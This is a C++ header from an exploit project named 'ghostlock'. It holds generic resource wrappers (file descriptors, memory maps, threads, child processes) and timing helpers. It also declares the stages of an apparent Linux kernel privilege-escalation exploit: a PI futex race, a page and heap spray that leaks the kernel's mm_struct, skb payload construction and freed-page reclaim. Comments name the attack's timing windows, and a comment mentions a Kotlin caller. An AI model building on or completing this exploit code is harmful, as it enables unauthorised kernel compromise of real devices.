/**
 * @file support.h
 * @brief 43499 核心的按用途头（由 core.cpp 拆分，声明/内联逐字保留）。
 */
#ifndef GHOSTLOCK_CORE_SUPPORT_H
#define GHOSTLOCK_CORE_SUPPORT_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <dirent.h>
#include <cerrno>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <atomic>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <ctime>
#include <unistd.h>

#include "target.h"

namespace ghostlock::memory { struct WriteRequest; }
namespace ghostlock::core { struct PageSprayInputs; }
namespace ghostlock::session { struct ExploitSession; }

/* ==== support/native_result.hpp ==== */
#ifndef GHOSTLOCK_NATIVE_RESULT_HPP
#define GHOSTLOCK_NATIVE_RESULT_HPP

#include <cerrno>
#include <cstdint>
#include <expected>
#include <system_error>

namespace ghostlock::support {
    struct SysError final {
        std::error_code code;

        [[nodiscard]] static SysError from_errno(int32_t value = errno) noexcept {
            return {{value, std::generic_category()}};
        }
    };

    /* C++23 expected, keeping the old Result name: has_value()/value()/error()
     * are unchanged, construction uses std::unexpected for failures. */
    template<typename T, typename E = SysError>
    using Result = std::expected<T, E>;
} // namespace ghostlock::support

#endif
/* ==== support/native_resource.hpp ==== */
#ifndef GHOSTLOCK_NATIVE_RESOURCE_HPP
#define GHOSTLOCK_NATIVE_RESOURCE_HPP


#include <pthread.h>
#include <sys/types.h>

#include <cstddef>
#include <span>
#include <string_view>
#include <type_traits>
#include <utility>

namespace ghostlock::support {
    class BorrowedFd final {
    public:
        constexpr BorrowedFd() noexcept = default;

        explicit constexpr BorrowedFd(int32_t fd) noexcept : fd_(fd) {
        }

        [[nodiscard]] constexpr bool valid() const noexcept { return fd_ >= 0; }
        [[nodiscard]] constexpr int32_t get() const noexcept { return fd_; }

    private:
        int32_t fd_ = -1;
    };

    static_assert(std::is_trivially_copyable_v<BorrowedFd>);
    static_assert(sizeof(BorrowedFd) == sizeof(int32_t));

    template<typename Callback>
    class ScopeExit final {
    public:
        explicit ScopeExit(Callback callback) noexcept(
            std::is_nothrow_move_constructible_v<Callback>)
            : callback_(std::move(callback)) {
        }

        ~ScopeExit() noexcept {
            if (active_) callback_();
        }

        ScopeExit(const ScopeExit &) = delete;

        ScopeExit &operator=(const ScopeExit &) = delete;

        ScopeExit(ScopeExit &&other) noexcept(
            std::is_nothrow_move_constructible_v<Callback>)
            : callback_(std::move(other.callback_)),
              active_(std::exchange(other.active_, false)) {
        }

        ScopeExit &operator=(ScopeExit &&) = delete;

        void release() noexcept { active_ = false; }

    private:
        Callback callback_;
        bool active_ = true;
    };

    template<typename Callback>
    [[nodiscard]] ScopeExit<std::decay_t<Callback> > make_scope_exit(
        Callback &&callback) noexcept(
        std::is_nothrow_constructible_v<std::decay_t<Callback>, Callback &&>) {
        return ScopeExit<std::decay_t<Callback> >(std::forward<Callback>(callback));
    }

    class UniqueFd final {
    public:
        constexpr UniqueFd() noexcept = default;

        explicit constexpr UniqueFd(int32_t fd) noexcept : fd_(fd) {
        }

        ~UniqueFd() noexcept;

        UniqueFd(const UniqueFd &) = delete;

        UniqueFd &operator=(const UniqueFd &) = delete;

        UniqueFd(UniqueFd &&other) noexcept;

        UniqueFd &operator=(UniqueFd &&other) noexcept;

        [[nodiscard]] constexpr bool valid() const noexcept { return fd_ >= 0; }
        [[nodiscard]] constexpr int32_t get() const noexcept { return fd_; }

        [[nodiscard]] constexpr BorrowedFd borrow() const noexcept {
            return BorrowedFd(fd_);
        }

        [[nodiscard]] int32_t release() noexcept;

        [[nodiscard]] int32_t release_to_process_lifetime(
            std::string_view reason) noexcept;

        void reset(int32_t fd = -1) noexcept;

    private:
        int32_t fd_ = -1;
    };

    class MappedRegion final {
    public:
        constexpr MappedRegion() noexcept = default;

        MappedRegion(void *address, std::size_t size) noexcept
            : address_(address), size_(size) {
        }

        ~MappedRegion() noexcept;

        MappedRegion(const MappedRegion &) = delete;

        MappedRegion &operator=(const MappedRegion &) = delete;

        MappedRegion(MappedRegion &&other) noexcept;

        MappedRegion &operator=(MappedRegion &&other) noexcept;

        [[nodiscard]] static Result<MappedRegion> map_anonymous(std::size_t size,
                                                                int32_t protection);

        [[nodiscard]] bool valid() const noexcept;

        [[nodiscard]] void *data() const noexcept { return address_; }
        [[nodiscard]] std::size_t size() const noexcept { return size_; }

        [[nodiscard]] std::span<std::byte> bytes() const noexcept;

        [[nodiscard]] void *release() noexcept;

        void reset() noexcept;

    private:
        void *address_ = nullptr;
        std::size_t size_ = 0;
    };

    using ThreadStopCallback = void (*)(void *) noexcept;

    class PthreadOwner final {
    public:
        enum class State { Empty, Running, StopRequested, Joined, Detached };

        constexpr PthreadOwner() noexcept = default;

        ~PthreadOwner() noexcept;

        PthreadOwner(const PthreadOwner &) = delete;

        PthreadOwner &operator=(const PthreadOwner &) = delete;

        PthreadOwner(PthreadOwner &&other) noexcept;

        PthreadOwner &operator=(PthreadOwner &&other) noexcept;

        [[nodiscard]] int32_t start(void *(*entry)(void *), void *argument,
                                ThreadStopCallback stop = nullptr,
                                void *stop_argument = nullptr) noexcept;

        void request_stop() noexcept;

        [[nodiscard]] int32_t join(void **result = nullptr) noexcept;

        [[nodiscard]] int32_t detach() noexcept;

        [[nodiscard]] pthread_t release() noexcept;

        [[nodiscard]] bool joinable() const noexcept;

        [[nodiscard]] State state() const noexcept { return state_; }
        [[nodiscard]] pthread_t native_handle() const noexcept { return thread_; }

    private:
        void detach_if_joinable() noexcept;

        pthread_t thread_{};
        State state_ = State::Empty;
        ThreadStopCallback stop_ = nullptr;
        void *stop_argument_ = nullptr;
    };

    class ChildProcess final {
    public:
        enum class State { Empty, Running, Reaped, Transferred };

        constexpr ChildProcess() noexcept = default;

        explicit constexpr ChildProcess(pid_t pid) noexcept
            : pid_(pid), state_(pid > 0 ? State::Running : State::Empty) {
        }

        ~ChildProcess() noexcept;

        ChildProcess(const ChildProcess &) = delete;

        ChildProcess &operator=(const ChildProcess &) = delete;

        ChildProcess(ChildProcess &&other) noexcept;

        ChildProcess &operator=(ChildProcess &&other) noexcept;

        [[nodiscard]] bool valid() const noexcept {
            return state_ == State::Running && pid_ > 0;
        }

        [[nodiscard]] pid_t get() const noexcept { return pid_; }
        [[nodiscard]] State state() const noexcept { return state_; }

        [[nodiscard]] pid_t release_to_handoff() noexcept;

        [[nodiscard]] int32_t terminate_and_wait(int32_t signal_number) noexcept;

        /* Marks a child the caller already reaped through waitpid(): the owner
   * drops the pid without signaling or waiting again. Idempotent; a no-op
   * when the owner no longer holds a running child. */
        void mark_reaped() noexcept;

    private:
        void cleanup_if_running() noexcept;

        pid_t pid_ = -1;
        State state_ = State::Empty;
    };
} // namespace ghostlock::support

#endif
/* ==== support/time.h ==== */
#ifndef GHOSTLOCK_RUNTIME_TIME_H
#define GHOSTLOCK_RUNTIME_TIME_H

#include <ctime>


#include <chrono>

namespace ghostlock::runtime_time {
    using Nanoseconds = std::chrono::nanoseconds;
    using Milliseconds = std::chrono::duration<double, std::milli>;

    [[nodiscard]] constexpr Nanoseconds to_duration(timespec value) noexcept {
        return std::chrono::seconds(value.tv_sec) +
               std::chrono::nanoseconds(value.tv_nsec);
    }

    [[nodiscard]] constexpr timespec normalize(timespec value) noexcept {
        constexpr long kNanosPerSecond = 1000000000L;
        value.tv_sec += value.tv_nsec / kNanosPerSecond;
        value.tv_nsec %= kNanosPerSecond;
        if (value.tv_nsec < 0) {
            --value.tv_sec;
            value.tv_nsec += kNanosPerSecond;
        }
        return value;
    }

    [[nodiscard]] constexpr double elapsed_ms(timespec start,
                                              timespec end) noexcept {
        return Milliseconds(to_duration(end) - to_duration(start)).count();
    }

    [[nodiscard]] inline timespec monotonic_now() noexcept {
        timespec now{};
        (void) clock_gettime(CLOCK_MONOTONIC, &now);
        return now;
    }

    [[nodiscard]] constexpr bool reached(timespec now,
                                         timespec deadline) noexcept {
        return to_duration(now) >= to_duration(deadline);
    }

    static inline double runtime_elapsed_between_ms(const timespec *start,
                                                    const timespec *end) {
        return elapsed_ms(*start, *end);
    }

    static inline double runtime_elapsed_ms(const timespec *reference) {
        const timespec now = monotonic_now();
        return runtime_elapsed_between_ms(reference, &now);
    }
} // namespace ghostlock::runtime_time

#endif
/* ==== support/status.hpp ==== */
#ifndef GHOSTLOCK_SUPPORT_STATUS_HPP
#define GHOSTLOCK_SUPPORT_STATUS_HPP

namespace ghostlock {
    /* Generic success/failure status for functions whose return carries no data.
     * true == success, false == failure. */
    using Status = bool;
} // namespace ghostlock

#endif
/* ==== support/fatal_error.hpp ==== */
#ifndef GHOSTLOCK_SUPPORT_FATAL_ERROR_HPP
#define GHOSTLOCK_SUPPORT_FATAL_ERROR_HPP

namespace ghostlock {
    /* Thrown only on pre-attack fatal errors where execution must stop. The
     * throwing site logs the details; the top-level handler just exits.
     * Never thrown from the PI-race / fork / heap-spray timing windows. */
    struct FatalError final {};
} // namespace ghostlock

#endif

/* ==== support/decls.hpp ==== */
#ifndef GHOSTLOCK_SUPPORT_DECLS_HPP
#define GHOSTLOCK_SUPPORT_DECLS_HPP

#include <cstddef>
#include <cstdint>
#include <sys/types.h>


namespace ghostlock::support {
    void read_first_line(const char *path, char *buf, size_t len);

    void log_startup_context(void);

    void log_sync(void);

    [[noreturn]] void fail_stop_dirty_race(const char *reason,
                                           int32_t error_number) noexcept;

    void init_p0_profile(void);

    long futex_op(
        uint32_t *uaddr, int32_t op, uint32_t val,
        const void *timeout_or_value, uint32_t *uaddr2, uint32_t val3);

    long sched_setattr_tid(int32_t tid, int32_t nice_value);

    void put64(unsigned char *p, size_t off, uint64_t value);

    void put32(unsigned char *p, size_t off, uint32_t value);

    pid_t clone_child(void);

    pid_t clone_leak_child(void);

    int32_t open_memfd(pid_t child);

    void kill_child(pid_t child);

    void close_reclaim_sockets(const ghostlock::core::PageSprayInputs &in);

    int32_t quarantine_reclaim_sockets(void);

    void release_quarantined_reclaim_sockets(void);

    Status stash_prebuilt_page(void);

    Status activate_prebuilt_page(void);

    void discard_prebuilt_page(void);

    void cleanup_page_prepare_state(const ghostlock::core::PageSprayInputs &in);

    int32_t clone_memfd(void);

    void prepare_ctxs(void);

    int32_t prepare_skb_payload(const ghostlock::core::PageSprayInputs &in, uintptr_t base);

    /**
     * @brief `spray_begin` 的结果：泄漏到的 `mm_struct` 与本次喷页起点时间。
     *
     * @note 纯数据；跨调用（Kotlin 取地址 → `land_with` 传回）时只搬这个值。
     *       注意它**不**携带 snitch 所有权：泄漏用的用户态映射在
     *       `spray_begin` 返回前已释放。
     */
    struct SprayResult final {
        std::uintptr_t mm_struct = 0;
        struct timespec started {};

        [[nodiscard]] bool valid() const noexcept { return mm_struct != 0; }
    };

    /**
     * @brief 第一次调用：喷页 + 泄漏，返回 `mm_struct`；不建载荷、不回收页。
     *
     * @param in 页面喷射输入（会话槽位由调用方持有）。
     * @return `mm_struct` 非 0 即成功；失败时已清理本次准备状态。
     * @note 喷页与泄漏必须留在同一次调用内：leak child 在 `pre`/`post` 之间
     *       fork，父进程 kill 完三组子进程后才等它；拆分两次调用会改变命中的
     *       `mm_struct`（P-A 设计 §十 决策 4）。
     */
    SprayResult spray_begin(const ghostlock::core::PageSprayInputs &in);

    /**
     * @brief 第二次调用：用 `mm_struct` 建载荷、关 memfd 释放页、reclaim。
     *
     * @param in    同一份页面喷射输入（fd 与槽位必须与 `spray_begin` 一致）。
     * @param spray `spray_begin` 的返回值；地址在此复核。
     * @return 页基址；0 表示拒绝或失败。
     * @note 地址守卫：`mm_struct` 必须仍在 direct map 内；`base` 由本函数复算。
     */
    uintptr_t land_with(const ghostlock::core::PageSprayInputs &in,
                        SprayResult &spray,
                        const unsigned char *skb_payload = nullptr,
                        std::size_t skb_payload_len = 0);

    uintptr_t prepare_good_kernel_page(const ghostlock::core::PageSprayInputs &in);

    /** @brief 用调用方提供的会话构造喷射输入（原子入口用；不读全局）。 */
    ghostlock::core::PageSprayInputs page_spray_inputs_for(
        session::ExploitSession &s, const ghostlock::memory::WriteRequest &request);

    ghostlock::core::PageSprayInputs page_spray_inputs_from_session(
        const ghostlock::memory::WriteRequest &request);
} // namespace ghostlock::support

#endif

#endif // GHOSTLOCK_CORE_SUPPORT_H
